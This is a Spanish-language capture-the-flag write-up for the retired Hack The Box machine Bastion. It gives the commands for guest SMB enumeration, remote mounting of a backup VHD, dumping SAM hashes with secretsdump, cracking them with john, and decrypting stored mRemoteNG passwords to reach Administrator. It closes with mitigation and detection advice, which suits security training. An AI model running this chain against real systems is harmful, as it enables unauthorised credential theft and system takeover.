---
machine: Bastion
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, smb, vhd, sam, mremoteng, cve]
---

# Bastion — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Windows Server 2016 en WORKGROUP, sin dominio. El SMB permite invitado y comparte `Backups` con una copia de Windows Image Backup: dos VHD, uno de 5,4 GB. En vez de descargarlo, se monta por SMB con `guestmount`, se copian `SAM` y `SYSTEM` y se sacan los hashes locales. El de `L4mpje` se rompe con rockyou y da SSH. Como administrador local queda `mRemoteNG`, cuyas contraseñas guardadas están cifradas con una clave fija (CVE-2023-30367) y llevan a `Administrator`.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh     OpenSSH for Windows 7.9
135/tcp   msrpc
139/tcp   netbios-ssn
445/tcp   smb     Windows Server 2016 Standard 14393
5985/tcp  http    Microsoft HTTPAPI 2.0 (WinRM)
```

Equipo suelto, no unido a dominio. `smb2-security-mode` muestra signing no requerido y el invitado habilitado.

## Enumeración

```bash
smbclient -L //<IP> -N
smbmap -H <IP> -u guest -p ''
```

```text
Backups   READ      Backups
```

```bash
smbclient //<IP>/Backups -N
smb: \> recurse ON
smb: \> ls
```

```text
note.txt
WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\
   9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd   (37 MB)
   9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd   (5,4 GB)
```

`note.txt` avisa de que no se descargue el VHD por tamaño. Es una pista: se puede montar en remoto.

## Foothold

```bash
sudo mkdir -p /mnt/bastion /mnt/vhd
sudo mount -t cifs //<IP>/Backups /mnt/bastion -o guest,vers=2.0
sudo guestmount --add "/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" \
  --inspector --ro /mnt/vhd
```

Con el disco montado, las colmenas del registro están a mano:

```bash
cp /mnt/vhd/Windows/System32/config/SAM /tmp/SAM
cp /mnt/vhd/Windows/System32/config/SYSTEM /tmp/SYSTEM
secretsdump.py -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:<hash>:::
```

`31d6cfe0d16ae931b73c59d7e0c089c0` es el hash de contraseña vacía: la cuenta está deshabilitada. Se ataca `L4mpje`:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
ssh L4mpje@<IP>
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

```powershell
dir "C:\Program Files (x86)"
```

`mRemoteNG` guarda las conexiones en `%APPDATA%\mRemoteNG\confCons.xml`, con las contraseñas cifradas en base64 y una clave por defecto (`mR3m`) si no se configuró contraseña maestra:

```powershell
type "$env:APPDATA\mRemoteNG\confCons.xml"
```

```xml
<Node Name="DC" Username="Administrator" Password="<base64>" ... />
```

Descifrado:

```bash
python3 mremoteng_decrypt.py -s '<base64>'
# Administrator:<password>
```

```bash
ssh Administrator@<IP>
```

WinRM (5985) también está abierto, así que `evil-winrm -u Administrator -p '<password>' -i <IP>` sirve igual.

## Evidencia

- `whoami` → `bastion\l4mpje` y después `bastion\administrator`.
- `confCons.xml` con nodos y contraseñas redactadas.
- Lectura de `root.txt` (redactado).

## Lecciones aprendidas

- Los shares no estándar con copias de seguridad son el objetivo: un backup contiene el disco entero, no solo documentos.
- Nunca hace falta descargar un VHD: `guestmount --add` sobre CIFS lo monta en solo lectura y evita 5 GB de tráfico.
- El hash de contraseña vacía se reconoce a simple vista y ahorra tiempo.
- `mRemoteNG` es un clásico: clave fija, XML en el perfil del usuario y credenciales de administrador guardadas.
- Enumerar el software instalado rinde más que buscar CVEs del sistema.

## Mitigaciones y detección

- Quitar acceso invitado a SMB y no exponer shares de backup.
- Cifrar los backups y restringirlos a cuentas de servicio; un VHD es un disco completo con SAM incluido.
- En `mRemoteNG`, exigir contraseña maestra y rotar las credenciales guardadas; actualizar a una versión que no use la clave fija.
- Deshabilitar SSH en Windows si no es necesario y restringir WinRM por red.
- Detección: accesos a shares `Backups` desde equipos no inventariados, montajes CIFS de VHD, lectura de `confCons.xml`.
- MITRE: T1039 (datos en shares), T1552.001 (credenciales en ficheros), T1555.

## Referencias

- CVE-2023-30367 (mRemoteNG, cifrado con clave fija).
- MITRE ATT&CK: T1039, T1552.001.
